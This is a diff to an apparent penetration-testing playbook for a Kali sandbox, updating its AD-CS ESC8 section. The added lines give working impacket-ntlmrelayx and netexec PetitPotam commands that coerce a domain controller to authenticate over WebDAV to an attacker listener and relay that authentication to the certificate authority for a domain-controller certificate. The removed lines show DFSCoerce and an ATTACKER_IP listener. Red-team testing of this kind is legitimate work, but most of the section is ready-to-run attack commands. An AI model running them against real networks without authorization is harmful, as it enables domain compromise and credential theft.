@@ -165,19 +165,28 @@ certipy-ad auth -pfx administrator.pfx
 
 The most-used AD-CS attack in modern engagements. Combines coerced authentication with HTTP relay.
 
+> WARNING - relaying needs the DC's coerced authentication to connect BACK to ntlmrelayx, and a
+> per-user Kali sandbox exposes only ONE target-reachable inbound port (see the "Pre-Configured
+> Payload Settings" block). The coercion RPC call itself is outbound and fine; the DC's callback
+> is what must reach you. An SMB callback (445) can never arrive, so only a WebDAV/HTTP callback
+> to that one port works, and only if the DC runs the WebClient service (it sends credentials to
+> an intranet-zone NAME, so a public tunnel hostname often gets no auth). Two numbers:
+>   - pool (no tunnel): ntlmrelayx listens on the pool port P, and the DC is coerced to LHOST:P;
+>   - ngrok/chisel: ntlmrelayx listens on 4444 (the local bind), and the DC is coerced to the
+>     block's LHOST:LPORT (the public port the tunnel forwards to 4444).
+> With no reachable inbound port this attack is not possible from the sandbox - record that and
+> move on.
+
 ```bash
-# Terminal 1: start ntlmrelayx with ADCS template
-impacket-ntlmrelayx -t http://$CA_HOST/certsrv/certfnsh.asp \
-  -smb2support --adcs --template DomainController
+# LISTEN_PORT = the pool port, or 4444 with a tunnel. LHOST/LPORT come from the block.
+# Terminal 1: ntlmrelayx with the ADCS template, HTTP listener on your one port, no SMB server.
+# It holds your handler port for ALL your chats while it runs: `ss -ltn` first, stop it after.
+impacket-ntlmrelayx -t http://$CA_HOST/certsrv/certfnsh.asp --adcs --template DomainController \
+  --http-port $LISTEN_PORT --no-smb-server
 
-# Terminal 2: coerce a DC to authenticate
-# Option A: PetitPotam (netexec module)
-nxc smb $DC_IP -u $USER -p $PASS -d $DOMAIN -M petitpotam -o LISTENER=$ATTACKER_IP
-
-# Option B: DFSCoerce (netexec module)
-nxc smb $DC_IP -u $USER -p $PASS -d $DOMAIN -M dfscoerce -o LISTENER=$ATTACKER_IP
-
-# Option C: PrinterBug (impacket-ntlmrelayx auto-coerce via spoolss)
+# Terminal 2: coerce the DC to a WebDAV (HTTP) path on your reachable endpoint. The listener
+# must be a NAME the DC resolves, in WebDAV form <name>@<port>/<path>:
+nxc smb $DC_IP -u $USER -p $PASS -d $DOMAIN -M petitpotam -o LISTENER=<lhost-name>@<LPORT>/x
 
 # Terminal 1 captures the coerced NTLM, relays to ICPR HTTP, gets cert as DC machine account
 # Then:
